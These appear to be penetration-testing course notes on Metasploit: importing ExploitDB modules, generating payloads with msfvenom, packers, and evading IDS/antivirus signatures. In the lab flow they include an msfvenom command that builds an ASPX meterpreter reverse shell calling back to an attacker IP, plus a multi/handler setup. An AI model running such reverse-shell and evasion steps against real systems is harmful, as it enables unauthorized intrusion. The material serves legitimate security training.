### Additional / Misc

```
# As long as the ported modules have been pushed into the main Metasploit-framework branch on GitHub, we should be updated with the latest modules.
# However, if we need only a specific module and do not want to perform a full upgrade, we can download that module and install it manually. 
# We will focus on searching ExploitDB for readily available Metasploit modules, which we can directly import into our version of msfconsole locally.

msf6 > search nagios           # Search inside Metasploit locally
searchsploit nagios3           # Search in internet on ExploitDB service
searchsploit -t Nagios3 --exclude=".py"           # Detailed serach wtih exclusioins

ls /usr/share/metasploit-framework/               # MSF - Directory Structure
ls .msf4/                                         # Hidden directory with some msf folders
output:

cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb   # Copy new exmploit to MS folder 
msfconsole -m /usr/share/metasploit-framework/modules/                                                             # Add/run module
msf6> loadpath /usr/share/metasploit-framework/modules/                     # Load/Reload additional path for modules
msf6 > reload_all                                                           # Reload MSF
msf6 > use exploit/unix/webapp/nagios3_command_injection                    # Use new exploit from Internet (not pre-installed from localhost)
```

### Introduction to MSFVenom

```
# MSFVenom is the successor of MSFPayload and MSFEncode, two stand-alone scripts that used to work in conjunction with msfconsole 
# to provide users with highly customizable and hard-to-detect payloads for their exploits.

# MSFVenom is the result of the marriage between these two tools. Before this tool, we had to pipe (|) the result from MSFPayload, 
# which was used to generate shellcode for a specific processor architecture and OS release, into MSFEncode, 
# which contained multiple encoding schemes used both for removing bad characters from shellcode. 

# This could sometimes cause instability during the runtime - and for evading older Anti-Virus (AV) and 
# endpoint Intrusion Prevention / Intrusion Detection (IPS/IDS) software.
```

### Creating Our Payloads

```
# Flow
nmap -sV -T4 -p- 10.10.10.5      # Found target ftp service port
ftp 10.10.10.5                   # Check connection, auth
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx        # Generate payload
ls                               # Check folder when we inside

msf6 > use multi/handler         # MSF - Setting Up Multi/Handler
set LHOST 10.10.14.5             # Set target host
set LPORT 1337                   # Set target port
run                              # run exploit

# Now we can trigger the .aspx payload on the web service. http://10.10.10.5/reverse_shell.aspx
# Doing so will load absolutely nothing visually speaking on the page, 
# but looking back to our multi/handler module, we would have received a connection.

meterpreter > getuid             # Check current user id with meterpreter on exploited host

### Packers

[PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf) 
[UPX packer](https://upx.github.io/)
[The Enigma Protector](https://enigmaprotector.com/)
[MPRESS](https://www.matcode.com/mpress.htm)

```
# The term Packer refers to the result of an executable compression process where the payload is packed together with an executable program 
# and with the decompression code in one single file. 
# When run, the decompression code returns the backdoored executable to its original state, 
# allowing for yet another layer of protection against file scanning mechanisms on target hosts.

A list of popular packer software:
- UPX packer	
- The Enigma   
- Protector	
- MPRESS       
- Alternate 
- EXE Packer	
- ExeStealth	
- Morphine
- MEW Themida

# If we want to learn more about packers, please check out the PolyPack project.

### Exploit Coding

```
# When coding our exploit or porting a pre-existing one over to the Framework, 
# it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system.

# For example, a typical Buffer Overflow exploit might be easily distinguished from regular traffic traveling over the network 
# due to its hexadecimal buffer patterns. 
# IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.

# When assembling our exploit code, randomization can help add some variation to those patterns, 
# which will break the IPS / IDS database signatures for well-known exploit buffers. 
# This can be done by inputting an Offset switch inside the code for the msfconsole module:


'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],


# Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. 
# Please note that the BoF code's purpose is to crash the service running on the target machine, 
# while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. 

```

### Post Notes

```
# Intrusion Prevention Systems and Antivirus Engines are the most common defender tools that can shoot down an initial foothold on the target. 
# These mainly function on signatures of the whole malicious file or the stub stage.

# This section covers evasion at a high level. 
# Be on the lookout for later modules that will dig deeper into the theory and practical knowledge needed to perform evasion more effectively.
```
